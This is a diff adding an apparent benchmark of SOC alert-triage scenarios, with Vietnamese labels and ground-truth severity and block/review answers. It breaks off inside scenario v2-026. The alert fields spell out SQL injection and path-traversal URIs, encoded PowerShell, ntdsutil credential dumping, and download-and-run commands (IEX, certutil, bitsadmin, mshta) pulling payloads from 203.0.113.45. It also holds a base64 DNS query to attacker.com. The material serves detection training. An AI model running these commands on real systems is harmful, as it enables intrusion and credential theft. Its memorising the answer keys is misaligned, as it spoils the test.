@@ -1,0 +1,4229 @@
+{
+  "scenarios": [
+    {
+      "id": "v2-001",
+      "name": "SQLi rõ ràng từ IP ngoài",
+      "alerts": [
+        {
+          "alert_id": "v2-001:w1",
+          "rule_name": "SQL Injection Strings In URI",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1190"
+          ],
+          "surface": "web",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "203.0.113.45",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 80,
+          "host": "proxy01",
+          "summary": "SQL Injection Strings In URI | 203.0.113.45 -> 192.168.56.20:80 | host=proxy01",
+          "fields": {
+            "method": "GET",
+            "uri": "/dvwa/?id=1%27+OR+%271%27%3D%271",
+            "status": "200",
+            "http_user_agent": "sqlmap/1.7.2",
+            "http_host": "192.168.56.20",
+            "http_referer": "",
+            "body_bytes_sent": "896"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1190"
+        ],
+        "correct_action": "block",
+        "siem_correct": true,
+        "reason": "SQLi từ IP ngoài — B01 high, tình huống tấn công rõ → high/block."
+      }
+    },
+    {
+      "id": "v2-002",
+      "name": "SQLi UNION SELECT",
+      "alerts": [
+        {
+          "alert_id": "v2-002:w1",
+          "rule_name": "SQL Injection Strings In URI",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1190"
+          ],
+          "surface": "web",
+          "timestamp": "2026-09-27T01:01:00Z",
+          "src_ip": "203.0.113.77",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 80,
+          "host": "proxy01",
+          "summary": "SQL Injection Strings In URI | 203.0.113.77 -> 192.168.56.20:80 | host=proxy01",
+          "fields": {
+            "method": "GET",
+            "uri": "/search?q=1+UNION+SELECT+1,2,3--",
+            "status": "200",
+            "http_user_agent": "sqlmap/1.7.2",
+            "http_host": "192.168.56.20",
+            "http_referer": "",
+            "body_bytes_sent": "896"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1190"
+        ],
+        "correct_action": "block",
+        "siem_correct": true,
+        "reason": "UNION SELECT là SQLi rõ — B01 high, tình huống nặng → high/block."
+      }
+    },
+    {
+      "id": "v2-003",
+      "name": "Path traversal /etc/passwd",
+      "alerts": [
+        {
+          "alert_id": "v2-003:w1",
+          "rule_name": "Path Traversal Exploitation Attempts",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1190"
+          ],
+          "surface": "web",
+          "timestamp": "2026-09-27T01:02:00Z",
+          "src_ip": "203.0.113.45",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 80,
+          "host": "proxy01",
+          "summary": "Path Traversal Exploitation Attempts | 203.0.113.45 -> 192.168.56.20:80 | host=proxy01",
+          "fields": {
+            "method": "GET",
+            "uri": "/download?file=../../../../../etc/passwd",
+            "status": "200",
+            "http_user_agent": "Mozilla/5.0",
+            "http_host": "192.168.56.20",
+            "http_referer": "",
+            "body_bytes_sent": "896"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "medium",
+        "attack_ids": [
+          "T1190"
+        ],
+        "correct_action": "review",
+        "siem_correct": true,
+        "reason": "Path traversal đọc file hệ thống — B02 medium, cần review."
+      }
+    },
+    {
+      "id": "v2-004",
+      "name": "Webshell URL chứa whoami",
+      "alerts": [
+        {
+          "alert_id": "v2-004:w1",
+          "rule_name": "Windows Webshell Strings",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1505.003"
+          ],
+          "surface": "web",
+          "timestamp": "2026-09-27T01:03:00Z",
+          "src_ip": "203.0.113.45",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 80,
+          "host": "proxy01",
+          "summary": "Windows Webshell Strings | 203.0.113.45 -> 192.168.56.20:80 | host=proxy01",
+          "fields": {
+            "method": "GET",
+            "uri": "/upload/shell.aspx?=whoami",
+            "status": "200",
+            "http_user_agent": "curl/7.68",
+            "http_host": "192.168.56.20",
+            "http_referer": "",
+            "body_bytes_sent": "896"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1505.003"
+        ],
+        "correct_action": "block",
+        "siem_correct": true,
+        "reason": "URL webshell gọi whoami — B03 high, dấu hiệu RCE → high/block."
+      }
+    },
+    {
+      "id": "v2-005",
+      "name": "URI chứa C:/Windows path",
+      "alerts": [
+        {
+          "alert_id": "v2-005:w1",
+          "rule_name": "Suspicious Windows Strings In URI",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1505.003"
+          ],
+          "surface": "web",
+          "timestamp": "2026-09-27T01:04:00Z",
+          "src_ip": "203.0.113.45",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 80,
+          "host": "proxy01",
+          "summary": "Suspicious Windows Strings In URI | 203.0.113.45 -> 192.168.56.20:80 | host=proxy01",
+          "fields": {
+            "method": "GET",
+            "uri": "/api?=C:/Windows/System32/cmd.exe",
+            "status": "200",
+            "http_user_agent": "Mozilla/5.0",
+            "http_host": "192.168.56.20",
+            "http_referer": "",
+            "body_bytes_sent": "896"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1505.003"
+        ],
+        "correct_action": "block",
+        "siem_correct": true,
+        "reason": "Chuỗi Windows path trong URI từ IP ngoài — B04 high → high/block."
+      }
+    },
+    {
+      "id": "v2-006",
+      "name": "w3wp sinh cmd.exe /c whoami",
+      "alerts": [
+        {
+          "alert_id": "v2-006:e1",
+          "rule_name": "Suspicious Process By Web Server Process",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1505.003",
+            "T1190"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:05:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Suspicious Process By Web Server Process |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+            "ParentCommandLine": "c:\\windows\\system32\\inetsrv\\w3wp.exe -ap DefaultAppPool",
+            "Image": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "cmd.exe /c whoami",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6120",
+            "ParentProcessId": "4892"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1505.003",
+          "T1190"
+        ],
+        "correct_action": "block",
+        "siem_correct": true,
+        "reason": "w3wp sinh cmd.exe từ IIS APPPOOL — webshell RCE. B05 high; tình huống không có dấu hiệu ứng dụng hợp lệ nào → high/block."
+      }
+    },
+    {
+      "id": "v2-007",
+      "name": "w3wp sinh powershell",
+      "alerts": [
+        {
+          "alert_id": "v2-007:e1",
+          "rule_name": "Suspicious Process By Web Server Process",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1505.003",
+            "T1190"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:06:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Suspicious Process By Web Server Process |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+            "ParentCommandLine": "c:\\windows\\system32\\inetsrv\\w3wp.exe -ap DefaultAppPool",
+            "Image": "C:\\Windows\\System32\\powershell.exe",
+            "CommandLine": "powershell.exe -c Get-Process",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6120",
+            "ParentProcessId": "4892"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1505.003",
+          "T1190"
+        ],
+        "correct_action": "block",
+        "siem_correct": true,
+        "reason": "w3wp sinh powershell — dấu hiệu webshell. B05 high → high/block."
+      }
+    },
+    {
+      "id": "v2-008",
+      "name": "Webshell chạy net user recon",
+      "alerts": [
+        {
+          "alert_id": "v2-008:e1",
+          "rule_name": "Webshell Detection With Command Line Keywords",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1505.003",
+            "T1018",
+            "T1033",
+            "T1087"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:07:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Webshell Detection With Command Line Keywords |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "OriginalFileName": "net.exe",
+            "CommandLine": "net user /domain",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6121",
+            "ParentProcessId": "4892"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1505.003",
+          "T1018",
+          "T1033",
+          "T1087"
+        ],
+        "correct_action": "block",
+        "siem_correct": true,
+        "reason": "net user /domain từ webshell — trinh sát tài khoản. B06 high → high/block."
+      }
+    },
+    {
+      "id": "v2-009",
+      "name": "Webshell dùng ntdsutil",
+      "alerts": [
+        {
+          "alert_id": "v2-009:e1",
+          "rule_name": "Webshell Hacking Activity Patterns",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1505.003",
+            "T1018",
+            "T1033",
+            "T1087"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:08:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Webshell Hacking Activity Patterns |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+            "Image": "C:\\Windows\\System32\\ntdsutil.exe",
+            "CommandLine": "ntdsutil ifm",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6122",
+            "ParentProcessId": "4892"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1505.003",
+          "T1018",
+          "T1033",
+          "T1087"
+        ],
+        "correct_action": "block",
+        "siem_correct": true,
+        "reason": "ntdsutil từ webshell — credential dump. B07 high → high/block."
+      }
+    },
+    {
+      "id": "v2-010",
+      "name": "PowerShell -enc từ cmd",
+      "alerts": [
+        {
+          "alert_id": "v2-010:e1",
+          "rule_name": "Suspicious Encoded PowerShell Command Line",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1059.001"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:09:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Suspicious Encoded PowerShell Command Line |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "OriginalFileName": "PowerShell.EXE",
+            "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgA",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6444",
+            "ParentProcessId": "6120"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1059.001"
+        ],
+        "correct_action": "block",
+        "siem_correct": true,
+        "reason": "PS -enc — mã hoá rõ ràng. B08 high → high/block."
+      }
+    },
+    {
+      "id": "v2-011",
+      "name": "PowerShell FromBase64String",
+      "alerts": [
+        {
+          "alert_id": "v2-011:e1",
+          "rule_name": "Base64 Encoded PowerShell Command Detected",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1027",
+            "T1140",
+            "T1059.001"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:10:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Base64 Encoded PowerShell Command Detected |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe [Convert]::FromBase64String('SQBFACAA')",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6445",
+            "ParentProcessId": "6120"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1027",
+          "T1140",
+          "T1059.001"
+        ],
+        "correct_action": "block",
+        "siem_correct": true,
+        "reason": "FromBase64String — decode payload. B09 high → high/block."
+      }
+    },
+    {
+      "id": "v2-012",
+      "name": "PowerShell IEX DownloadString",
+      "alerts": [
+        {
+          "alert_id": "v2-012:e1",
+          "rule_name": "Suspicious PowerShell Download and Execute Pattern",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1059.001"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:11:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Suspicious PowerShell Download and Execute Pattern |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/p.ps1')",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6446",
+            "ParentProcessId": "6120"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1059.001"
+        ],
+        "correct_action": "block",
+        "siem_correct": true,
+        "reason": "IEX DownloadString từ IP ngoài — stager. B10 high → high/block."
+      }
+    },
+    {
+      "id": "v2-013",
+      "name": "PowerShell Invoke-WebRequest (medium)",
+      "alerts": [
+        {
+          "alert_id": "v2-013:e1",
+          "rule_name": "Usage Of Web Request Commands And Cmdlets",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1059.001"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:12:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Usage Of Web Request Commands And Cmdlets |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe Invoke-WebRequest -Uri http://example.com",
+            "ParentImage": "C:\\Windows\\explorer.exe",
+            "User": "DOMAIN\\admin",
+            "ProcessId": "6501",
+            "ParentProcessId": "5000"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "medium",
+        "attack_ids": [
+          "T1059.001"
+        ],
+        "correct_action": "review",
+        "siem_correct": true,
+        "reason": "Invoke-WebRequest bởi DOMAIN\\admin — có thể cấu hình. B11 medium → review."
+      }
+    },
+    {
+      "id": "v2-014",
+      "name": "certutil -urlcache tải file",
+      "alerts": [
+        {
+          "alert_id": "v2-014:e1",
+          "rule_name": "Suspicious Download Via Certutil.EXE",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1027",
+            "T1105"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:13:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Suspicious Download Via Certutil.EXE |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\certutil.exe",
+            "OriginalFileName": "CertUtil.exe",
+            "CommandLine": "certutil.exe -urlcache -split -f http://203.0.113.45/p.exe C:\\temp\\p.exe",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6220",
+            "ParentProcessId": "6120"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "medium",
+        "attack_ids": [
+          "T1027",
+          "T1105"
+        ],
+        "correct_action": "review",
+        "siem_correct": true,
+        "reason": "certutil tải file từ IP ngoài — suspicious. B12 medium → review."
+      }
+    },
+    {
+      "id": "v2-015",
+      "name": "certutil -decode",
+      "alerts": [
+        {
+          "alert_id": "v2-015:e1",
+          "rule_name": "File Decoded From Base64/Hex Via Certutil.EXE",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1027"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:14:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "File Decoded From Base64/Hex Via Certutil.EXE |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\certutil.exe",
+            "OriginalFileName": "CertUtil.exe",
+            "CommandLine": "certutil.exe -decode C:\\temp\\enc.txt C:\\temp\\dec.exe",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6221",
+            "ParentProcessId": "6120"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1027"
+        ],
+        "correct_action": "block",
+        "siem_correct": true,
+        "reason": "certutil -decode là decode payload. B13 high → high/block."
+      }
+    },
+    {
+      "id": "v2-016",
+      "name": "bitsadmin /transfer tải file",
+      "alerts": [
+        {
+          "alert_id": "v2-016:e1",
+          "rule_name": "File Download Via Bitsadmin",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1197",
+            "T1036.003",
+            "T1105"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:15:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "File Download Via Bitsadmin |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\bitsadmin.exe",
+            "OriginalFileName": "bitsadmin.exe",
+            "CommandLine": "bitsadmin /transfer job http://203.0.113.45/p.exe C:\\temp\\p.exe",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6222",
+            "ParentProcessId": "6120"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "medium",
+        "attack_ids": [
+          "T1197",
+          "T1036.003",
+          "T1105"
+        ],
+        "correct_action": "review",
+        "siem_correct": true,
+        "reason": "bitsadmin download — có thể lành tính. B14 medium → review."
+      }
+    },
+    {
+      "id": "v2-017",
+      "name": "mshta chạy HTA từ xa",
+      "alerts": [
+        {
+          "alert_id": "v2-017:e1",
+          "rule_name": "Remotely Hosted HTA File Executed Via Mshta.EXE",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1218.005"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:16:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Remotely Hosted HTA File Executed Via Mshta.EXE |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\mshta.exe",
+            "OriginalFileName": "MSHTA.EXE",
+            "CommandLine": "mshta.exe http://203.0.113.45/payload.hta",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6223",
+            "ParentProcessId": "6120"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1218.005"
+        ],
+        "correct_action": "block",
+        "siem_correct": true,
+        "reason": "mshta http từ IP ngoài — remote HTA. B15 high → high/block."
+      }
+    },
+    {
+      "id": "v2-018",
+      "name": "whoami /priv từ IIS APPPOOL",
+      "alerts": [
+        {
+          "alert_id": "v2-018:e1",
+          "rule_name": "Security Privileges Enumeration Via Whoami.EXE",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1033"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:17:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Security Privileges Enumeration Via Whoami.EXE |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\whoami.exe",
+            "OriginalFileName": "whoami.exe",
+            "CommandLine": "whoami.exe /priv",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6124",
+            "ParentProcessId": "6120"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1033"
+        ],
+        "correct_action": "block",
+        "siem_correct": true,
+        "reason": "whoami /priv từ IIS APPPOOL — không phải user hợp lệ. B16 high → high/block."
+      }
+    },
+    {
+      "id": "v2-022",
+      "name": "schtasks chạy file trong Temp /sc once",
+      "alerts": [
+        {
+          "alert_id": "v2-022:e1",
+          "rule_name": "Suspicious Scheduled Task Creation Involving Temp Folder",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1053.005"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:21:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Suspicious Scheduled Task Creation Involving Temp Folder |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "CommandLine": "schtasks.exe /create /tn Updater /tr C:\\Temp\\upd.exe /sc once /st 12:00",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6128",
+            "ParentProcessId": "6120"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1053.005"
+        ],
+        "correct_action": "block",
+        "siem_correct": true,
+        "reason": "schtasks temp + /sc once — persistence nguy hiểm. B20 high → high/block."
+      }
+    },
+    {
+      "id": "v2-023",
+      "name": "PsExec từ cmd tới host nội bộ",
+      "alerts": [
+        {
+          "alert_id": "v2-023:e1",
+          "rule_name": "Psexec Execution",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1569",
+            "T1021"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:22:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Psexec Execution |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Users\\Public\\psexec.exe",
+            "OriginalFileName": "psexec.c",
+            "CommandLine": "psexec.exe -accepteula \\\\192.168.56.50 cmd.exe",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6130",
+            "ParentProcessId": "6120"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "medium",
+        "attack_ids": [
+          "T1569",
+          "T1021"
+        ],
+        "correct_action": "review",
+        "siem_correct": true,
+        "reason": "PsExec bởi IIS APPPOOL — không phải admin. B22 medium → review."
+      }
+    },
+    {
+      "id": "v2-024",
+      "name": "DNS query chứa base64",
+      "alerts": [
+        {
+          "alert_id": "v2-024:n1",
+          "rule_name": "Suspicious DNS Query with B64 Encoded String",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1048.003",
+            "T1071.004"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:23:00Z",
+          "src_ip": "192.168.56.20",
+          "dest_ip": "8.8.8.8",
+          "dest_port": 53,
+          "host": "sensor-net-01",
+          "summary": "Suspicious DNS Query with B64 Encoded String | 192.168.56.20 -> 8.8.8.8:53 | host=sensor-net-01",
+          "fields": {
+            "event_type": "dns",
+            "proto": "UDP",
+            "app_proto": "dns",
+            "query": "dGVzdA==.attacker.com",
+            "flow": {
+              "pkts_toserver": 5,
+              "pkts_toclient": 5,
+              "bytes_toserver": 400,
+              "bytes_toclient": 600,
+              "start": "2026-09-27T01:23:00Z",
+              "end": "2026-09-27T01:23:00Z"
+            }
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "medium",
+        "attack_ids": [
+          "T1048.003",
+          "T1071.004"
+        ],
+        "correct_action": "review",
+        "siem_correct": true,
+        "reason": "DNS query b64 từ web-win-01 — tunneling có thể. B23 medium → review."
+      }
+    },
+    {
+      "id": "v2-025",
+      "name": "Suricata C2 beacon ra ngoài",
+      "alerts": [
+        {
+          "alert_id": "v2-025:n1",
+          "rule_name": "AegisSOC - Suricata Malware or C2 Communication Alert",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1071"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:24:00Z",
+          "src_ip": "192.168.56.20",
+          "dest_ip": "203.0.113.45",
+          "dest_port": 8080,
+          "host": "sensor-net-01",
+          "summary": "AegisSOC - Suricata Malware or C2 Communication Alert | 192.168.56.20 -> 203.0.113.45:8080 | host=sensor-net-01",
+          "fields": {
+            "event_type": "alert",
+            "proto": "TCP",
+            "app_proto": "http",
+            "alert": {
+              "signature": "ET MALWARE Possible C2 Beacon",
+              "signature_id": 2030002,
+              "category": "A Network Trojan was detected"
+            },
+            "flow": {
+              "pkts_toserver": 40,
+              "pkts_toclient": 40,
+              "bytes_toserver": 3200,
+              "bytes_toclient": 2800,
+              "start": "2026-09-27T01:24:00Z",
+              "end": "2026-09-27T01:24:00Z"
+            }
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1071"
+        ],
+        "correct_action": "block",
+        "siem_correct": true,
+        "reason": "Suricata ET MALWARE từ web-win-01 ra ngoài — C2. C02 high → high/block."
+      }
+    },
+    {
+      "id": "v2-019",
+      "name": "systeminfo từ IIS APPPOOL (nghi trinh sát)",
+      "alerts": [
+        {
+          "alert_id": "v2-019:e1",
+          "rule_name": "Suspicious Execution of Systeminfo",
+          "rule_level": "low",
+          "attack_ids": [
+            "T1082"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:18:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Suspicious Execution of Systeminfo |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\systeminfo.exe",
+            "OriginalFileName": "sysinfo.exe",
+            "CommandLine": "systeminfo.exe",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6125",
+            "ParentProcessId": "6120"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "medium",
+        "attack_ids": [
+          "T1082"
+        ],
+        "correct_action": "review",
+        "siem_correct": false,
+        "reason": "systeminfo từ IIS APPPOOL (user web, KHÔNG phải admin) là dấu hiệu trinh sát của webshell. Rule B17 gán low; tình huống thực tế cần review."
+      }
+    },
+    {
+      "id": "v2-021",
+      "name": "schtasks /sc onlogon — persistence thật",
+      "alerts": [
+        {
+          "alert_id": "v2-021:e1",
+          "rule_name": "Scheduled Task Creation Via Schtasks.EXE",
+          "rule_level": "low",
+          "attack_ids": [
+            "T1053.005"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:20:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Scheduled Task Creation Via Schtasks.EXE |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "CommandLine": "schtasks.exe /create /tn Updater /tr C:\\temp\\upd.exe /sc onlogon",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6127",
+            "ParentProcessId": "6120"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1053.005"
+        ],
+        "correct_action": "block",
+        "siem_correct": false,
+        "reason": "schtasks /create /sc onlogon chạy file trong C:\\temp là persistence thật, không phải quản trị. Rule B19 gán LOW; tình huống thực tế high/block."
+      }
+    },
+    {
+      "id": "v2-026",
+      "name": "Máy quét IT quét cổng (báo nhầm)",
+      "alerts": [
+        {
+          "alert_id": "v2-026:n1",
+          "rule_name": "AegisSOC - Suricata Network Scan Alert",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1046",
+            "T1595"
+          ],
+          "surface": "network",
